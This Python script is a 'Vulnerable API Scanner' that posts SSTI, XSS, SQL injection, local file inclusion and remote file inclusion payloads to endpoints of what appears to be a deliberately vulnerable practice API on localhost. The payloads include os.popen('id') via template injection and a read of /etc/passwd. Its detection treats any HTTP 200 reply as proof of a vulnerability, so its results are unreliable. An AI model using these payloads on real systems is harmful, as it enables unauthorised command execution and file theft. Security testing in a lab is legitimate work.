import requests
import argparse
import textwrap
import json

parser = argparse.ArgumentParser(
    description='Vulnerable API Scanner',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent('''Example:
        vuln-api-scanner.py -u http://127.0.0.1 -e sqli -p payload.txt # specified vuln and payload file
        vuln-api-scanner.py -u http://127.0.0.1 -e sqli # specified vuln with default payload
        vuln-api-scanner.py -u http://127.0.0.1 # test all vulns
'''))

parser.add_argument('-u', '--url', action='store', dest='url', default='http://127.0.0.1:4444', help='specified URL')
parser.add_argument('-e', '--exploit', action='store', dest='exploit', default='all', help='specified Vulnerability')
parser.add_argument('-p', '--payload', action='store', dest='payload', default='default' ,help='specified payloads')

class Scanner:
    def __init__(self, args):
        
        self.args = args
        self.url = self.args.url

        if self.args.payload == "default":
            self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
            self.xss_payload = "<script>alert('Hi')</script>"
            self.sqli_payload = "'or 1=1--"
            self.lfi_payload = "/etc/passwd"
            self.rfi_payload = "http://127.0.0.1:4444/text"
        else:
            if len(open(self.args.payload).read()) <= 1:
                raise Exception("Payload file must not be empty")
            else:
                self.ssti_payload = open(self.args.payload)
                self.xss_payload = open(self.args.payload)
                self.sqli_payload = open(self.args.payload)
                self.lfi_payload = open(self.args.payload)
                self.rfi_payload = open(self.args.payload)
    
    def exploit_runner(self, endpoint, payloads, parameters, vulnerability):
        try:
            if self.args.payload == "default":
                if len(parameters) > 1:
                    request_body = {parameters[0]: payloads, parameters[1]: payloads}
                else:
                    request_body = {parameters[0]: payloads}
                print(request_body)
                response = requests.post(self.url + endpoint, json=request_body, timeout=10)
                if response.status_code == 200:
                    print(response.text)
                    print(f"Vulnerable to {vulnerability}!\n")
                else:
                    print("Not vulnerable")
            else:
                for payload in payloads.read().splitlines():
                    if len(parameters) > 1:
                        request_body = {parameters[0]: payload, parameters[1]: payloads}
                    else:
                        request_body = {parameters[0]: payload}
                    print(request_body)
                    response = requests.post(self.url + endpoint, json=request_body, timeout=10)
                    if response.status_code == 200:
                        print(response.text)
                        print(f"Vulnerable to {vulnerability}!\n")
                    else:
                        print("Not vulnerable")
        except Exception as e:
            print("Encounter an error:", e)

        
class Injection(Scanner):
    def ssti(self):
        endpoint = "/api/sstivuln"
        payloads = self.ssti_payload
        parameters = ["mathexp"]
        vulnerability = "ssti"
        self.exploit_runner(endpoint, payloads, parameters, vulnerability)
    
    def xss(self):
        endpoint = "/api/xssreflected"
        payloads = self.xss_payload
        parameters = ["username"]
        vulnerability = "xss"
        self.exploit_runner(endpoint, payloads, parameters, vulnerability)

    def sqli(self):
        endpoint = "/api/sqlivuln"
        payloads = self.sqli_payload
        parameters = ["username", "password"]
        vulnerability = "sqli"
        self.exploit_runner(endpoint, payloads, parameters, vulnerability)

    def hhi(self):
        pass

class BrokenAccessControl(Scanner):
    def lfi(self):
        endpoint = "/api/lfivuln"
        payloads = self.lfi_payload
        parameters = ["filename"]
        vulnerability = "lfi"
        self.exploit_runner(endpoint, payloads, parameters, vulnerability)

    def rfi(self):
        endpoint = "/api/rfivuln"
        payloads = self.rfi_payload
        parameters = ["imagelink"]
        vulnerability = "rfi"
        self.exploit_runner(endpoint, payloads, parameters, vulnerability)

if __name__ == "__main__":
    args = parser.parse_args()

    injection_client = Injection(args)
    broken_access_client = BrokenAccessControl(args)

    if args.exploit == "ssti":
        injection_client.ssti()
    elif args.exploit == "xss":
        injection_client.xss()
    elif args.exploit == "sqli":
        injection_client.sqli()
    elif args.exploit == "hhi":
        injection_client.hhi()
    elif args.exploit == "lfi":
        broken_access_client.lfi()
    elif args.exploit == "rfi":
        broken_access_client.rfi()
    else:
        injection_client.ssti()
        injection_client.xss()
        injection_client.sqli()
        injection_client.hhi()
        broken_access_client.lfi()
        broken_access_client.rfi()
